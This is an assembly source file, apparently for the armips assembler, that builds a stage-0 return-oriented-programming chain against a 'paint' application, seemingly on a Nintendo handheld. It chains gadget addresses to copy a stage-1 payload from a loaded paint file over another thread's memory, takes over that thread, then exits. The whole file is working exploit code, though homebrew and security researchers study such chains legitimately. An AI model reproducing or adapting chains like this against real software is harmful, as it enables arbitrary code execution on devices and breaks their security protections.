.open "paint_rop_stage1.s",0x0
	stage1_size:
		.incbin "paint_rop_stage1.s"
	stage1_size_end:
.close

.nds

.include "paint_constants.s"
.include "paint_macros.s"

.create "../build/rop_stage0.bin",PAINT_ROP_COPY_PTR

set_lr ROP_PAINT_NOP
.word ROP_PAINT_POP_R0PC
  .word LINEAR_THREAD_TAKEOVER_PTR
.word ROP_PAINT_POP_R1PC
  .word PAINT_FILE_BUFFER + 0x10
.word ROP_PAINT_POP_R2R3R4R5R6PC
  .word stage1_size_end - stage1_size
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
.word PAINT_MEMCPY
store_value LINEAR_THREAD_LOOP_BREAK_PTR, 0x0
.word PAINT_SVC_EXITTHREAD

.close
